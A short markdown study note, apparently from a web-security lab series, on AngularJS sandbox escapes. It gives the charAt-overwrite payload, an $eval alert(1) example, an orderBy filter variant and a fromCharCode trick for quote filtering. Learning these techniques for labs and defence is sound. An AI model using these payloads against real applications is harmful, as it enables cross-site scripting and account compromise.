# AngularJS Sandbox Escape

## Overview

A sandbox escape tricks AngularJS into treating malicious code as safe.

The most famous escape abuses:

```javascript
charAt()
```

---

# Core Payload

```javascript
'a'.constructor.prototype.charAt=[].join
```

---

# Why It Works

Normally:

```javascript
"a".charAt(0)
```

returns:

```text
a
```

---

After modification:

```javascript
"a".charAt(0)
```

returns:

```text
all characters
```

instead.

---

# Effect On AngularJS

AngularJS internally uses:

```javascript
isIdent()
```

to determine whether characters are valid identifiers.

---

By breaking:

```javascript
charAt()
```

AngularJS incorrectly believes malicious code is safe.

---

# Standard Escape

```javascript
$eval('x=alert(1)')
```

---

However some labs disable:

```javascript
$eval
```

---

# Alternative Technique

Use:

```javascript
orderBy
```

filter.

---

Example:

```javascript
[123]|orderBy:'PAYLOAD'
```

---

# String Restriction Bypass

If quotes are blocked:

Use:

```javascript
toString()
```

and:

```javascript
String.fromCharCode()
```

to build payloads dynamically.

---

# Related Lab

- Lab24

---

# Key Takeaways

- Sandbox escapes abuse AngularJS internals.
- charAt() modification is a classic technique.
- orderBy can replace $eval().